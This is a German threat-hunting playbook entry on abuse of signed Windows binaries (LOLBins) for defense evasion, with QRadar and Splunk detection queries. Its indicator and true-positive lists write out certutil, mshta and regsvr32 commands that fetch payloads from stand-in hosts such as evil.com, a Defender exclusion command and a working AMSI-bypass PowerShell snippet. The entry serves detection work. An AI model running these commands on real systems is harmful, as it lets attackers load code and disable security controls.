HUNT-005

LOLBins / Defense Evasion

MITRE: T1218.004 · T1218.005 · T1218.007 · T1218.010 · T1218.011 · T1059 · T1562.001 · T1562.006  |  Taktik: Defense Evasion  |  Basis-Konfidenz: 60

Beschreibung

Living-off-the-Land Binaries (LOLBins) sind legitime Windows-Systemtools die von Angreifern missbraucht werden um Sicherheitslösungen zu umgehen. Da die Binaries signiert sind, erkennen viele AV-Lösungen den Missbrauch nicht.

Zusätzlich: AMSI-Bypass um PowerShell-Erkennung zu umgehen, ETW-Patching um Event-Logging zu deaktivieren, Defender-Exclusions hinzufügen.

QRadar AQL

certutil.exe als Downloader/Decoder

-- certutil.exe als Downloader/Decoder
SELECT sourceip, username, ProcessName, CommandLine
FROM events
WHERE EventID = 4688
  AND ProcessName ILIKE '%certutil%'
  AND (CommandLine ILIKE '%-urlcache%'
    OR CommandLine ILIKE '%-decode%'
    OR CommandLine ILIKE '%-decodehex%'
    OR CommandLine ILIKE '%http%'
    OR CommandLine ILIKE '%ftp%')
LAST 24 HOURS

-- mshta.exe mit Remote-Inhalt
SELECT sourceip, username, ProcessName, CommandLine
FROM events
WHERE EventID = 4688
  AND ProcessName ILIKE '%mshta%'
  AND (CommandLine ILIKE '%http%'
    OR CommandLine ILIKE '%ftp%'
    OR CommandLine ILIKE '%\\\\%'
    OR CommandLine ILIKE '%javascript%'
    OR CommandLine ILIKE '%vbscript%')
LAST 24 HOURS

-- regsvr32.exe Squiblydoo
SELECT sourceip, username, ProcessName, CommandLine
FROM events
WHERE EventID = 4688
  AND ProcessName ILIKE '%regsvr32%'
  AND (CommandLine ILIKE '%/u%'
    AND CommandLine ILIKE '%/i:%'
    AND CommandLine ILIKE '%scrobj%')
LAST 24 HOURS

-- Defender Exclusion hinzufügen
SELECT sourceip, username, ProcessName, CommandLine
FROM events
WHERE EventID = 4688
  AND CommandLine ILIKE '%Add-MpPreference%'
  AND CommandLine ILIKE '%-ExclusionPath%'
LAST 24 HOURS

Splunk SPL

-- LOLBins Commandline-Analyse via Sysmon Event 1
index=sysmon EventCode=1
| eval lolbin_type=case(
    match(Image,"(?i)certutil\\.exe") AND match(CommandLine,"(?i)-urlcache|-decode"),"certutil Downloader",
    match(Image,"(?i)mshta\\.exe") AND match(CommandLine,"(?i)http|javascript|vbscript"),"mshta Remote HTA",
    match(Image,"(?i)regsvr32\\.exe") AND match(CommandLine,"(?i)/i:http.*scrobj"),"regsvr32 Squiblydoo",
    match(Image,"(?i)rundll32\\.exe") AND match(CommandLine,"(?i)javascript:|.dll,#"),"rundll32 Abuse",
    match(Image,"(?i)wmic\\.exe") AND match(CommandLine,"(?i)process call create"),"WMIC Process Create",
    match(Image,"(?i)msiexec\\.exe") AND match(CommandLine,"(?i)/i http"),"msiexec Remote MSI",
    match(Image,"(?i)bitsadmin\\.exe") AND match(CommandLine,"(?i)/transfer|/download"),"BITS Download",
    1==1,null())
| where isnotnull(lolbin_type)
| table _time, ComputerName, User, Image, CommandLine, lolbin_type, ParentImage

-- AMSI Bypass Erkennung
index=sysmon EventCode=1
| where match(CommandLine,"(?i)(AmsiScanBuffer|amsi\\.dll|amsi_result|AMSI_RESULT_NOT_DETECTED)")
    OR match(CommandLine,"(?i)(\\[Runtime.InteropServices.Marshal\\]|VirtualProtect.*amsi)")
| table _time, ComputerName, User, CommandLine

Sysmon / Windows Security Events

-- Sysmon Event 1: Prozess-Erstellung mit vollständiger CommandLine
-- Wichtig: Sysmon muss CommandLine-Logging aktiviert haben!

-- certutil Indikatoren:
--   certutil.exe -urlcache -split -f http://evil.com/file
--   certutil.exe -decode encoded.b64 output.exe

-- mshta Indikatoren:
--   mshta.exe http://evil.com/payload.hta
--   mshta.exe vbscript:Execute(...)

-- regsvr32 Squiblydoo:
--   regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
--   → scrobj.dll ist signiert, führt aber beliebigen Code aus

-- AMSI Bypass Patterns in PowerShell:
--   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
--   .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

True Positives

  • certutil.exe -urlcache -split -f http://evil.com/payload.exe (Konfidenz: 92)
  • mshta.exe http://attacker.com/stage2.hta (Konfidenz: 90)
  • regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll (Konfidenz: 95)
  • Add-MpPreference -ExclusionPath C:\Users\Public (Konfidenz: 88)
  • AMSI Bypass: AmsiScanBuffer Patch in PowerShell (Konfidenz: 90)
  • wmic process call create "cmd.exe /c whoami" (Konfidenz: 80)

False Positives & Whitelist

  • Legitimes certutil für Zertifikat-Operationen — certutil -addstore. Whitelist: Operationen ohne HTTP/decode
  • IT-Admin WMIC für Fernverwaltung — Whitelist: bekannte Admin-Hosts
  • Software-Deployment via msiexec — Whitelist: bekannte MSI-URLs/Hashes
  • Enterprise AV die regsvr32 für Registrierung nutzt — Whitelist: bekannte Vendor-Pfade

Varianten & Evasion-Techniken

  • VAR-001: Umbenennen von LOLBins (Conf-Modifier: -15) — certutil.exe → svchost32.exe, aber Commandline-Pattern bleibt gleich
  • VAR-002: xwizard.exe / odbcconf.exe (Conf-Modifier: -20) — Seltenere LOLBins die weniger bekannt sind
  • VAR-003: PowerShell Constrained Language Mode Bypass (Conf-Modifier: -10) — Umgehung via Downgrade auf PS v2
  • VAR-004: ETW Patching (Conf-Modifier: -30) — Event-Logging deaktiviert, kaum erkennbar ohne Endpoint-Monitoring
